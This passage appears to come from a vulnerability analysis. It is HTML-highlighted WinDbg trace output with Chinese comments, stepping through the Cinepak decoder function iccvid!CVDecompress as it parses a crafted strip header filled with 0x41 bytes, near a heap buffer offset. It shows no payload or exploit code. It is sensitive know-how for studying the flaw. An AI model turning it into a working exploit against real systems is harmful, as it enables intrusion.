iccvid!CVDecompress+<span class="number">0xcb</span> (73b72279)     [br=<span class="number">0</span>] <span class="comment">; 相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72271 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc3</span>:</span><br><span class="line">73b72271 3c11            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">11h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x11</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72273 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc5</span>:</span><br><span class="line">73b72273 0f8557010000    <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x222</span> (73b723d0)    [br=<span class="number">0</span>] <span class="comment">; 不相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72279 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcb</span>:</span><br><span class="line">73b72279 8d4508          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">8</span>]                                    <span class="comment">; eax = 0x025afd38,a1地址,a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xce</span>:</span><br><span class="line">73b7227c <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span>                                            <span class="comment">; arg3 = eax = 0x025afd38,保存减去Strip Header大小后的数据大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227d <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcf</span>:</span><br><span class="line">73b7227d 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span>                                            <span class="comment">; arg2 = 0xC,Strip Header大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227f <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd1</span>:</span><br><span class="line">73b7227f ff75f8          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]    <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; arg1 = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72282 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd4</span>:</span><br><span class="line">73b72282 e8fffeffff      <span class="keyword">call</span>    iccvid!ULongSub (73b72186)                     <span class="comment">; 如果arg1&gt;=arg2,则返回0,且计算出减去Strip Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72287 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd9</span>:</span><br><span class="line">73b72287 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72289 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xdb</span>:</span><br><span class="line">73b72289 0f8c65010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7228f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe1</span>:</span><br><span class="line">73b7228f 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72291 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe3</span>:</span><br><span class="line">73b72291 8a6608          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba691a=<span class="number">41</span> <span class="comment">; ah = 0x41,Strips bottom Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72294 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe6</span>:</span><br><span class="line">73b72294 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72296 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe8</span>:</span><br><span class="line">73b72296 8a6e04          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">4</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6916=<span class="number">41</span> <span class="comment">; ch = 0x41,Strips top Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004100</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72299 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xeb</span>:</span><br><span class="line">73b72299 8a4609          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">9</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba691b=<span class="number">41</span> <span class="comment">; al = 0x41,Strips bottom Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004141</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004100</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xee</span>:</span><br><span class="line">73b7229c 8a4e05          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">5</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6917=<span class="number">41</span> <span class="comment">; cl = 0x41,Strips top Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004141</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf1</span>:</span><br><span class="line">73b7229f 2bc1            <span class="keyword">sub</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                    <span class="comment">; (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf3</span>:</span><br><span class="line">73b722a1 660faf432e      <span class="keyword">imul</span>    <span class="built_in">ax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">2Eh</span>]    <span class="built_in">ds</span>:<span class="number">0023</span>:001535de=<span class="number">0001</span> <span class="comment">; ebx = a1 = 0x001535b0,[(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf8</span>:</span><br><span class="line">73b722a6 89450c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=<span class="number">00000060</span> <span class="comment">; a2 = eax = 0x00 = [(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfb</span>:</span><br><span class="line">73b722a9 8b45fc          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00002000</span> <span class="comment">; eax = [ebp-4] = 0x2000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ac <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfe</span>:</span><br><span class="line">73b722ac 3bc7            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断局部变量[ebp-4]是否为0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ae <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x100</span>:</span><br><span class="line">73b722ae <span class="number">7421</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 为0则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x102</span>:</span><br><span class="line">73b722b0 807d1300        <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">13h</span>],<span class="number">0</span>       <span class="built_in">ss</span>:<span class="number">0023</span>:025afd43=<span class="number">00</span> <span class="comment">; 判断a3(Len_of_CVID_data)的最高字节是否为0,Frame Header的Flags</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x106</span>:</span><br><span class="line">73b722b4 751b            <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 不相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span 